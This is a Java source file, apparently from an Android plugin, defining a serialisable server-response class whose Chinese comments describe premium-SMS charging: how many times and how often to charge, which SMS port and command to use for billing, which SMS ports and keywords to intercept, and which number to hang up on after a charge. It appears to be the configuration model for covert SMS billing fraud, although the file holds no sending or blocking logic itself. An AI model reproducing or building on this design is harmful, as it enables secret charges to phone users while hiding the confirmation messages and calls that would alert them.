package com.xstd.plugin.api;

import com.plugin.internet.core.ResponseBase;
import com.plugin.internet.core.json.JsonProperty;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: AM10:52
 * To change this template use File | Settings | File Templates.
 */
public class ActiveResponse extends ResponseBase implements Serializable {

    @JsonProperty("name")
    public String channelName;

    //运营商
    @JsonProperty("operator")
    public String operator;

    //扣费次数
    @JsonProperty("times")
    public int times;

    //扣费时间间隔
    @JsonProperty("interval")
    public int interval;

    @JsonProperty("exeStart")
    public int exeStart;

    @JsonProperty("exeEnd")
    public int exeEnd;

    //拦截的短信端口号
    @JsonProperty("blockSmsPort")
    public String blockSmsPort;

    @JsonProperty("blockKeys")
    public String blockKeys;

    //扣费以后自动挂断的电话号码
    @JsonProperty("blockNum")
    public String blockNum;

    //单位秒
    @JsonProperty("blockMinTime")
    public int blockMinTime;

    @JsonProperty("blockMaxTime")
    public int blockMaxTime;

    //短信扣费的方式发送的端口号
    @JsonProperty("port")
    public String port;

    //短信扣费的指令
    @JsonProperty("instruction")
    public String instruction;

    //扣费的类型
    @JsonProperty("type")
    public int type;

    @JsonProperty("checkMoneyInfo")
    public String checkMoneyInfo;

    public ActiveResponse() {
    }

    @Override
    public String toString() {
        return "ActiveResponse{" +
                   "channelName='" + channelName + '\'' +
                   ", operator='" + operator + '\'' +
                   ", times=" + times +
                   ", interval=" + interval +
                   ", exeStart=" + exeStart +
                   ", exeEnd=" + exeEnd +
                   ", blockSmsPort='" + blockSmsPort + '\'' +
                   ", blockKeys='" + blockKeys + '\'' +
                   ", blockNum='" + blockNum + '\'' +
                   ", blockMinTime=" + blockMinTime +
                   ", blockMaxTime=" + blockMaxTime +
                   ", port='" + port + '\'' +
                   ", instruction='" + instruction + '\'' +
                   ", type=" + type +
                   ", checkMoneyInfo='" + checkMoneyInfo + '\'' +
                   '}';
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        channelName = in.readUTF();
        operator = in.readUTF();
        times = in.readInt();
        interval = in.readInt();
        exeStart = in.readInt();
        exeEnd = in.readInt();
        blockSmsPort = in.readUTF();
        blockKeys = in.readUTF();
        blockNum = in.readUTF();
        blockMinTime = in.readInt();
        blockMaxTime = in.readInt();
        port = in.readUTF();
        instruction = in.readUTF();
        type = in.readInt();
        checkMoneyInfo = in.readUTF();
    }

    private void writeObject(ObjectOutputStream out) throws IOException {
        if (channelName == null) {
            channelName = "";
        }
        if (operator == null) {
            operator = "";
        }
        if (blockSmsPort == null) {
            blockSmsPort = "";
        }
        if (blockKeys == null) {
            blockKeys = "";
        }
        if (blockNum == null) {
            blockNum = "";
        }
        if (port == null) {
            port = "";
        }
        if (instruction == null) {
            instruction = "";
        }
        if (checkMoneyInfo == null) {
            checkMoneyInfo = "";
        }
        out.writeUTF(channelName);
        out.writeUTF(operator);
        out.writeInt(times);
        out.writeInt(interval);
        out.writeInt(exeStart);
        out.writeInt(exeEnd);
        out.writeUTF(blockSmsPort);
        out.writeUTF(blockKeys);
        out.writeUTF(blockNum);
        out.writeInt(blockMinTime);
        out.writeInt(blockMaxTime);
        out.writeUTF(port);
        out.writeUTF(instruction);
        out.writeInt(type);
        out.writeUTF(checkMoneyInfo);
    }
}
